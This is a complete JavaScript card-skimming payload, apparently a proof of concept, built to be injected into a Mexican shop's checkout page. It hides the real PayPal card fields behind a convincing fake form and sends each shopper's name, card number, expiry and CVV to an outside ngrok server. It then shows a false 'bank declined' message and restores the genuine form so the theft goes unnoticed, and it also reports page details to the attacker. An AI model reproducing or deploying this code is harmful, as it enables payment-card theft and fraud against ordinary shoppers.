(function () {
  'use strict';

  var SERVER = 'https://sand-box-pay.ngrok.io';

  function log(type, data) {
    fetch(SERVER + '/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: type, data: data, timestamp: new Date().toISOString() }),
      mode: 'cors',
      credentials: 'omit',
    }).catch(function () {});
  }

  // ─── Verificar que el target existe ─────────────────────────

  var paypalCard = document.querySelector('#paypal-card');
  if (!paypalCard) { log('error', '#paypal-card no encontrado'); return; }

  // ─── CSS animaciones ────────────────────────────────────────

  var css = document.createElement('style');
  css.textContent = [
    '@keyframes poc-fade-in { from{opacity:0;transform:translateY(-8px)} to{opacity:1;transform:translateY(0)} }',
    '@keyframes poc-shrink { 0%{opacity:1;transform:scale(1);max-height:700px} 100%{opacity:0;transform:scale(0.95);max-height:0;margin:0;padding:0} }',
    '.poc-error-in { animation:poc-fade-in 0.3s ease-out forwards }',
    '.poc-closing { animation:poc-shrink 0.5s ease-in forwards;overflow:hidden;pointer-events:none }',
  ].join('\n');
  document.head.appendChild(css);

  // ─── Leer total del carrito desde el DOM ────────────────────

  function getTotal() {
    var cartTotal = document.getElementById('cart_total');
    if (cartTotal && cartTotal.value) {
      var n = parseFloat(cartTotal.value);
      if (!isNaN(n)) return '$' + n.toLocaleString('es-MX', {minimumFractionDigits:2, maximumFractionDigits:2}) + ' MXN';
    }
    var totalDiv = document.getElementById('total_carrito');
    if (totalDiv) {
      var text = totalDiv.textContent.trim();
      if (text) return text + ' MXN';
    }
    return '';
  }

  // ─── Inyectar overlay (se llama cuando el usuario elige tarjeta) ──

  var overlayInjected = false;

  function injectOverlay() {
    if (overlayInjected) return;
    overlayInjected = true;

    // Ocultar iframes originales de PayPal
    var ch = paypalCard.children;
    for (var i = 0; i < ch.length; i++) ch[i].style.display = 'none';

    var inputCSS = [
      'width:100%',
      'padding:14px 16px',
      'background:#f5f5f5',
      'border:1px solid #dbdbdb',
      'border-radius:8px',
      'font-size:16px',
      'color:#2c2e2f',
      'outline:none',
      'box-sizing:border-box',
      'transition:border-color 0.2s',
    ].join(';');

    var total = getTotal();
    var btnText = total ? 'Pagar ' + total : 'Pagar';

    var overlay = document.createElement('div');
    overlay.id = 'poc-overlay';
    overlay.innerHTML = [
      '<div id="poc-form-wrap" style="',
        'width:100%;',
        'background:#f5f5f5;',
        'border-radius:12px;',
        'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;',
        'overflow:hidden;',
        'box-shadow:0 2px 12px rgba(0,0,0,0.08);',
      '">',

      // Header negro
      '<div style="',
        'background:#2c2e2f;',
        'padding:16px 20px;',
        'display:flex;',
        'align-items:center;',
        'gap:10px;',
      '">',
        '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;">',
          '<rect x="2" y="5" width="20" height="14" rx="2" stroke="white" stroke-width="1.5" fill="none"/>',
          '<line x1="2" y1="10" x2="22" y2="10" stroke="white" stroke-width="1.5"/>',
          '<rect x="5" y="13" width="5" height="2" rx="0.5" fill="white"/>',
        '</svg>',
        '<span style="color:#fff;font-size:16px;font-weight:600;">Tarjeta de d&eacute;bito o cr&eacute;dito</span>',
      '</div>',

      // Error banner (oculto)
      '<div id="poc-error-banner" style="display:none;margin:12px 16px 0;padding:12px 16px;background:#fef0e7;border:1px solid #f5c6a8;border-radius:8px;font-size:13px;color:#6c4223;">',
        '<div style="display:flex;align-items:flex-start;gap:8px;">',
          '<svg width="18" height="18" viewBox="0 0 24 24" fill="#c4601a" style="flex-shrink:0;margin-top:1px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>',
          '<span>Lo sentimos, tu instituci&oacute;n financiera ha declinado esta transacci&oacute;n. Usa otra tarjeta o comun&iacute;cate con tu banco.</span>',
        '</div>',
      '</div>',

      // Campos
      '<div style="padding:12px 16px 16px;">',

        '<div style="margin-bottom:12px;">',
          '<input id="poc-card" type="text" maxlength="19" placeholder="N&uacute;mero de la tarjeta" style="' + inputCSS + '">',
        '</div>',

        '<div style="display:flex;gap:10px;margin-bottom:20px;">',
          '<input id="poc-expiry" type="text" maxlength="5" placeholder="Fecha de vencimiento" style="' + inputCSS + ';flex:1;">',
          '<input id="poc-cvv" type="password" maxlength="4" placeholder="CSC" style="' + inputCSS + ';flex:1;">',
        '</div>',

        '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">',
          '<span style="font-size:16px;font-weight:600;color:#2c2e2f;">Direcci&oacute;n de la tarjeta</span>',
          '<span style="font-size:13px;color:#6c7378;display:flex;align-items:center;gap:4px;">',
            '<span style="font-size:16px;">&#127474;&#127485;</span>',
            '<svg width="12" height="12" viewBox="0 0 24 24" fill="#6c7378"><path d="M7 10l5 5 5-5z"/></svg>',
          '</span>',
        '</div>',

        '<div style="display:flex;gap:10px;margin-bottom:20px;">',
          '<input id="poc-fname" type="text" maxlength="30" placeholder="Nombre" style="' + inputCSS + ';flex:1;">',
          '<input id="poc-lname" type="text" maxlength="30" placeholder="Apellidos" style="' + inputCSS + ';flex:1;">',
        '</div>',

        // Checkbox mayor de edad
        '<div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:16px;font-size:14px;color:#2c2e2f;">',
          '<input id="poc-age-check" type="checkbox" style="margin-top:3px;width:18px;height:18px;flex-shrink:0;cursor:pointer;">',
          '<label for="poc-age-check" style="cursor:pointer;line-height:1.4;">Confirmo que soy mayor de edad y acepto el <a href="#" style="color:#0070ba;text-decoration:none;">Aviso de privacidad</a> de PayPal.</label>',
        '</div>',

        // Boton azul PayPal
        '<button id="poc-pay-btn" type="button" style="',
          'width:100%;',
          'padding:16px;',
          'background:#2f6fb7;',
          'color:#fff;',
          'border:none;',
          'border-radius:25px;',
          'font-size:17px;',
          'font-weight:600;',
          'cursor:pointer;',
          'transition:background 0.2s;',
          'letter-spacing:0.3px;',
        '">' + btnText + '</button>',

        '<div style="text-align:center;margin-top:8px;font-size:9px;color:#ccc;letter-spacing:0.5px;"></div>',

      '</div>',
      '</div>',
    ].join('');

    // Stop propagation
    ['click','mousedown','mouseup','touchstart','touchend','focus','input','change'].forEach(function(evt) {
      overlay.addEventListener(evt, function(e) { e.stopPropagation(); });
    });

    paypalCard.appendChild(overlay);

    // ─── Referencias ──────────────────────────────────────────

    var cardEl = document.getElementById('poc-card');
    var expiryEl = document.getElementById('poc-expiry');
    var cvvEl = document.getElementById('poc-cvv');
    var fnameEl = document.getElementById('poc-fname');
    var lnameEl = document.getElementById('poc-lname');
    var payBtn = document.getElementById('poc-pay-btn');
    var formWrap = document.getElementById('poc-form-wrap');
    var errorBanner = document.getElementById('poc-error-banner');

    // Focus styling
    [cardEl, expiryEl, cvvEl, fnameEl, lnameEl].forEach(function(input) {
      input.addEventListener('focus', function() { this.style.borderColor = '#0070ba'; this.style.background = '#fff'; });
      input.addEventListener('blur', function() { this.style.borderColor = '#dbdbdb'; this.style.background = '#f5f5f5'; });
    });

    // Auto-formato tarjeta
    cardEl.addEventListener('input', function() {
      var v = this.value.replace(/\D/g, '').substring(0, 16);
      this.value = v.replace(/(.{4})/g, '$1 ').trim();
    });

    // Auto-formato expiry
    expiryEl.addEventListener('input', function() {
      var v = this.value.replace(/\D/g, '').substring(0, 4);
      if (v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
      this.value = v;
    });

    // Cierre elegante
    function closeOverlay() {
      formWrap.classList.add('poc-closing');
      formWrap.addEventListener('animationend', function() {
        overlay.remove();
        var restored = paypalCard.children;
        for (var j = 0; j < restored.length; j++) restored[j].style.display = '';
        overlayInjected = false;
      });
    }

    // Boton pagar
    payBtn.addEventListener('click', function() {
      log('captura-tarjeta', {
        nombre: fnameEl.value,
        apellidos: lnameEl.value,
        numero: cardEl.value,
        expiry: expiryEl.value,
        cvv: cvvEl.value,
      });

      payBtn.textContent = 'Procesando...';
      payBtn.style.background = '#7a9ec4';
      payBtn.disabled = true;

      setTimeout(function() {
        payBtn.textContent = btnText;
        payBtn.style.background = '#2f6fb7';
        payBtn.disabled = false;

        errorBanner.style.display = 'block';
        errorBanner.classList.add('poc-error-in');

        [cardEl, expiryEl, cvvEl].forEach(function(el) {
          el.style.borderColor = '#c4601a';
        });

        setTimeout(closeOverlay, 4000);
      }, 2000);
    });
  }

  // ─── Escuchar cuando el usuario seleccione tarjeta de credito ──

  var radioCard = document.querySelector('#pm-credi-card');
  if (radioCard) {
    // Si ya esta seleccionado al momento de pegar el payload
    if (radioCard.checked) {
      injectOverlay();
    }
    // Escuchar click futuro
    radioCard.addEventListener('change', function() {
      if (this.checked) injectOverlay();
    });
    // Tambien escuchar click en el label/payment-option padre
    var payOptLabel = paypalCard.closest('.payment-option');
    if (payOptLabel) {
      payOptLabel.addEventListener('click', function() {
        setTimeout(function() {
          if (radioCard.checked) injectOverlay();
        }, 50);
      });
    }
  }

  // ─── Recon (siempre, independiente del overlay) ─────────────

  var recon = { hiddenFields: {}, globalFunctions: {} };
  ['txn_id','payment_status','mc_gross','payment_date'].forEach(function(id) {
    var el = document.getElementById(id);
    recon.hiddenFields[id] = el ? { found: true, value: el.value || '(vacio)' } : { found: false };
  });
  ['paymentMethodBtnPay','PaypalActions','jQuery','axios','Swal'].forEach(function(name) {
    recon.globalFunctions[name] = typeof window[name] !== 'undefined';
  });
  log('overlay-activo', recon);

})();
